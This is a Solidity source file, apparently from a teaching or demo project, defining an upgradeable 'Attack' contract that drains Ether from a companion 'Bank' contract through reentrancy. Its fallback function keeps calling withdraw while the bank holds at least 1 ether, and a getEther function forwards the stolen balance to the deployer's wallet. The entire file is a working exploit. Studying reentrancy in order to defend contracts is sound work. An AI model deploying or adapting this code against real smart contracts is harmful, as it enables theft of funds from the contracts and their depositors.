// SPDX-License-Identifier:MIT

import "./Bank.sol";

pragma solidity ^0.8.10;

import "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";

contract Attack is Initializable, UUPSUpgradeable, OwnableUpgradeable{
    Bank public bank;
    address payable private Dev;

    function initialize(address _bankContractAddress) public initializer{
        bank = Bank(_bankContractAddress);
        Dev = payable(msg.sender);
        __Ownable_init();
    }

    function _authorizeUpgrade(address) internal override onlyOwner {}

    // Fallback is called when EtherStore sends Ether to this contract.
    fallback() external payable {
        if (address(bank).balance >= 1 ether) {
            bank.withdraw();
        }
    }

    function getEther() public{
        Dev.transfer(address(this).balance);    // Takes all the ether from Attack contract to dev wallet.
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        bank.deposit{value: 1 ether}();
        bank.withdraw();
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}